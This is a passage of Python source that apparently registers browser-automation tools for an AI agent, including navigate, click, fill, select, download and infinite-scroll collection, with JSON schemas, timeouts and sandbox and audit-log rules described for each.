                    "type": "object",
                    "properties": {
                        "raw": {
                            "type": "boolean",
                            "description": "Skip LLM summarization, return full accessibility tree as-is",
                            "default": False,
                        },
                    },
                },
            },
            handler=browser_snapshot,
            timeout_sec=60,
            default_enabled=False,
        ),

        ToolEntry(
            name="browser_navigate",
            schema={
                "name": "browser_navigate",
                "description": "Navigate the active browser session to URL within the agent's authorized auth domains. Returns the post-navigation accessibility snapshot inline (no follow-up browser_snapshot call needed in the common case).",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "url": {"type": "string", "description": "URL to navigate to"},
                    },
                    "required": ["url"],
                },
            },
            handler=browser_navigate,
            timeout_sec=60,
            default_enabled=False,
        ),

        ToolEntry(
            name="browser_scroll",
            schema={
                "name": "browser_scroll",
                "description": "Scroll the active browser page up or down by a pixel amount.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "direction": {"type": "string", "enum": ["up", "down"], "default": "down"},
                        "amount": {"type": "integer", "default": 500},
                    },
                },
            },
            handler=browser_scroll,
            # A scroll on a lazy-loading page waits for what the scroll starts
            # loading, and Playwright's own defaults are higher than this cap
            # was — so the harness gave up first and reported TOOL_TIMEOUT
            # instead of whatever went wrong. 60s is what the other tools that
            # drive this browser already use.
            timeout_sec=60,
            default_enabled=False,
        ),

        ToolEntry(
            name="browser_click",
            schema={
                "name": "browser_click",
                "description": "Click an element. Accepts a @eN ref ID from the last browser_snapshot or a CSS selector (fallback when refs are unavailable, e.g. shadow DOM).",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "ref_or_selector": {"type": "string", "description": "@eN ref or CSS selector"},
                        "timeout": {"type": "integer", "default": 30000},
                    },
                    "required": ["ref_or_selector"],
                },
            },
            handler=browser_click,
            timeout_sec=45,
            default_enabled=False,
        ),

        ToolEntry(
            name="browser_fill",
            schema={
                "name": "browser_fill",
                "description": "Type text into an input element. Accepts a @eN ref ID or CSS selector. The text value is NOT recorded in the audit log — only its length.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "ref_or_selector": {"type": "string", "description": "@eN ref or CSS selector"},
                        "text": {"type": "string", "description": "Text to type"},
                    },
                    "required": ["ref_or_selector", "text"],
                },
            },
            handler=browser_fill,
            timeout_sec=30,
            default_enabled=False,
        ),

        ToolEntry(
            name="browser_select",
            schema={
                "name": "browser_select",
                "description": (
                    "Choose one option of a native <select> — the one control"
                    " browser_click and browser_fill cannot work: a closed"
                    " native dropdown draws its options outside the page, so a"
                    " click on an option matches nothing, and fill only types"
                    " into text fields. Call browser_snapshot first and pass"
                    " the @eN ref of the combobox. Give exactly one of value"
                    " (the option's value attribute), label (its visible text)"
                    " or index (0-based over every option in document order,"
                    " the same list the snapshot counts in '(N options)')."
                    " Playwright's select_option does the choosing, so the"
                    " page's own input and change handlers fire — including one"
                    " that navigates. The answer names the option now selected"
                    " and says whether the page URL changed; the form is NOT"
                    " submitted, so click its submit button after this. Native"
                    " <select> only: a dropdown built from divs is driven with"
                    " browser_click, and a <select multiple> is refused. For a"
                    " select the snapshot treats as a secret field — a card"
                    " number, a card expiry, a security code — the value is"
                    " still set, but the answer repeats no label, no value and"
                    " no option list."
                ),
                "parameters": {
                    "type": "object",
                    "properties": {
                        "ref_or_selector": {
                            "type": "string",
                            "description": "@eN ref from the last browser_snapshot, or a CSS selector",
                        },
                        "value": {
                            "type": "string",
                            "description": "The value attribute of the option to choose",
                        },
                        "label": {
                            "type": "string",
                            "description": "The visible text of the option to choose",
                        },
                        "index": {
                            "type": "integer",
                            "description": "0-based position of the option among all the options of this select",
                        },
                    },
                    "required": ["ref_or_selector"],
                },
            },
            handler=browser_select,
            timeout_sec=45,
            default_enabled=False,
        ),

        ToolEntry(
            name="browser_wait_for",
            schema={
                "name": "browser_wait_for",
                "description": "Wait for an element to become visible. Accepts a @eN ref ID or CSS selector.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "ref_or_selector": {"type": "string", "description": "@eN ref or CSS selector"},
                        "timeout": {"type": "integer", "default": 30000},
                    },
                    "required": ["ref_or_selector"],
                },
            },
            handler=browser_wait_for,
            timeout_sec=45,
            default_enabled=False,
        ),

        ToolEntry(
            name="browser_extract",
            schema={
                "name": "browser_extract",
                "description": "Return the current page's full HTML. Fallback inspection surface when the accessibility-tree snapshot is insufficient (canvas elements, shadow DOM, missing ARIA labels).",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "save_to": {
                            "type": "string",
                            "description": f"Write the whole HTML to this file (relative names land in the agent sandbox) and name it in the header. Raw HTML is the largest thing these tools return; without this the answer is cut at {cap} chars with no way to read the rest."
                        }
                    },
                },
            },
            handler=browser_extract,
            timeout_sec=30,
            default_enabled=False,
        ),

        ToolEntry(
            name="browser_screenshot",
            schema={
                "name": "browser_screenshot",
                "description": "Capture a PNG screenshot of the active page. Saved under the agent's own screenshots/ folder; the relative path is returned. The folder is capped at 50 files (LRU eviction).",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "full_page": {"type": "boolean", "default": False, "description": "Capture full scrollable page vs viewport only"},
                    },
                },
            },
            handler=browser_screenshot,
            timeout_sec=30,
            default_enabled=False,
        ),

        ToolEntry(
            name="browser_download",
            schema={
                "name": "browser_download",
                "description": (
                    "Click an element that downloads a file and save the file"
                    " into the agent's own sandbox, or into a folder the"
                    " firewall grants it — see `directory`. Call"
                    " browser_snapshot first"
                    " and pass the @eN ref of the download link. The answer"
                    " gives the path, the size, the sha256 and what the FIRST"
                    " BYTES say the file is (pdf, djvu, zip container, rar, 7z,"
                    " gzip, ole, html, markup, unknown) — when that contradicts"
                    " the extension the first line says so, and a site that"
                    " answered with a login or error page instead of the file is"
                    " reported as 'this is an HTML page, not a file'. The file is"
                    " never opened beyond its header, never parsed and never run."
                    " Every saved file gets one line in downloads.jsonl beside"
                    " the files, and the answer ends with how many records that"
                    " folder holds and how many were saved today: some sites"
                    " charge per download — the count is here so you can keep the"
                    " budget."
                ),
                "parameters": {
                    "type": "object",
                    "properties": {
                        "ref_or_selector": {
                            "type": "string",
                            "description": "@eN ref from the last browser_snapshot, or a CSS selector",
                        },
                        "directory": {
                            "type": "string",
                            "description": f"Folder to save into. A relative path resolves inside the agent sandbox, relative to the agent root (default '{_DOWNLOAD_DIR_DEFAULT}'); one that climbs out of the sandbox with '..' is refused. An absolute path is accepted only where Agent Permissions → Extended Paths grants this agent write access to it, and refused anywhere else.",
                            "default": _DOWNLOAD_DIR_DEFAULT,
                        },
                        "timeout_seconds": {
                            "type": "integer",
                            "description": f"How long to wait for the download to START after the click (default {_DOWNLOAD_TIMEOUT_DEFAULT}, max {_DOWNLOAD_TIMEOUT_MAX}). A real site can lead through two navigations and a host probe first. It does NOT bound the transfer — that is allowed for separately, so a big file is not cut off — and raising it helps only when the site is slow to begin. If nothing starts you get a message naming both URLs and the tab count, not a hang.",
                            "default": _DOWNLOAD_TIMEOUT_DEFAULT,
                        },
                        "note": {
                            "type": "string",
                            "description": "Free text stored with this file in downloads.jsonl — a title, a catalogue id, why you fetched it. One line.",
                        },
                    },
                    "required": ["ref_or_selector"],
                },
            },
            handler=browser_download,
            # Above the longest wait the session call itself can make, so the
            # answer is a sentence and not TOOL_TIMEOUT — see the constant.
            timeout_sec=_DOWNLOAD_TOOL_TIMEOUT_SEC,
            default_enabled=False,
        ),

        ToolEntry(
            name="browser_switch_tab",
            schema={
                "name": "browser_switch_tab",
                "description": "Switch the active page to the tab at `index` (0-based) in the browser context.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "index": {"type": "integer", "description": "0-based tab index"},
                    },
                    "required": ["index"],
                },
            },
            handler=browser_switch_tab,
            timeout_sec=10,
            default_enabled=False,
        ),

        ToolEntry(
            name="browser_collect",
            schema={
                "name": "browser_collect",
                "description": f"Scroll a container and collect all matching items. Use CSS selectors for container and items (discover them from browser_snapshot's scrollable-container hints or browser_extract's raw HTML). Scrolls the container, extracts items matching item_selector, deduplicates, and repeats until no new items appear or max_scrolls is reached. Ideal for infinite-scroll lists (orders, search results, product catalogs). Pass extract=[\"text\",\"href\"] to get the links — one item per line with its link first, so nothing separates an item from its URL. The whole list is collected in one pass and handed back one window at a time: the answer states `items X-Y of N` and, while items remain, the exact next call to make (offset=Y). Do NOT repeat the same call to see more — walk with offset, which is also the only thing that changes between windows.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "container": {
                            "type": "string",
                            "description": "CSS selector of the scrollable container element",
                        },
                        "item_selector": {
                            "type": "string",
                            "description": "CSS selector for individual items within the container",
                        },
                        "extract": {
                            "type": "array",
                            "items": {"type": "string"},
                            "description": "Attributes to extract from each item: 'text' (textContent), 'href' (link URL), 'html' (innerHTML), or any data-* / HTML attribute name",
                            "default": ["text"],
                        },
                        "max_scrolls": {
                            "type": "integer",
                            "description": "Maximum scroll iterations before stopping",
                            "default": 30,
                        },
                        "scroll_pause_ms": {
                            "type": "integer",
                            "description": "Milliseconds to wait between scrolls for content to load",
                            "default": 5000,
                        },
                        "dedup_by": {
                            "type": "string",
                            "description": "Which extracted attribute to use for deduplication",
                            "default": "text",
                        },
                        "offset": {
                            "type": "integer",
                            "description": "First item of the collected list to show (0-based). Use the offset the previous answer named.",
                            "default": 0,
                        },
                        "limit": {
                            "type": "integer",
                            "description": f"Items per window (default {COLLECT_LIMIT_DEFAULT}, max {COLLECT_LIMIT_MAX}). A window also stops early when the lines would outgrow the tool-result cap, and says so.",
                            "default": COLLECT_LIMIT_DEFAULT,
                        },
                    },
                    "required": ["container", "item_selector"],
                },
            },
            handler=browser_collect,
            timeout_sec=120,
            default_enabled=False,
        ),

        ToolEntry(
            name="browser_close",
            schema={
                "name": "browser_close",
                "description": "Close the active browser session and free Camoufox resources. The next browse_page(keep_open=true) call opens a fresh session.",
                "parameters": {
                    "type": "object",
                    "properties": {},
                },
            },
            handler=browser_close,
            timeout_sec=30,
            default_enabled=False,
        ),
    ]
